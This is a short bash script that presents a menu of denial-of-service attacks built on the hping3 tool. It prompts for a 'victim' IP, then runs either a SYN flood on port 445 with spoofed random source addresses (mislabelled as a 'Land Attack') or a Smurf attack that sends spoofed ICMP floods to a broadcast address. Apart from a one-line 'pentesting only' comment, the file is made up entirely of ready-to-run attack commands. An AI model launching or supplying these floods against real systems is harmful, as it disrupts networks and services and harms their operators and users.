
#!/bin/bash
# Simple menu hping3 script
# Please use only for pentesting and security reasons
# Thanks to Dennis Williamson@askubuntu.com && 0daysecurity.com

PS3='Please choose tipe of your attack: '
options=("DDOS Land Attack" "Smurf Attack" "Help with hping3" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "DDOS Land Attack")
	echo "Input your victims IP"
	read foo
           sudo  hping3 -V -c 1000000 -d 120 -S -w 64 -p 445 -s 445 --flood --rand-source $foo
            ;;
        "Smurf Attack")
	echo "Input your victims IP"
	read foo
	echo "Input broadcast IP"
	read bar
	##Smurf Attack: This is a type of denial-of-service attack that floods a target system via spoofed broadcast ping messages.
        sudo  hping3 -1 --flood -a $foo $bar
            ;;
	"Help with hping3")
	man hping3
	;;
         "Quit")
            break
            ;;
        *) echo "invalid option $REPLY";;
    esac
done
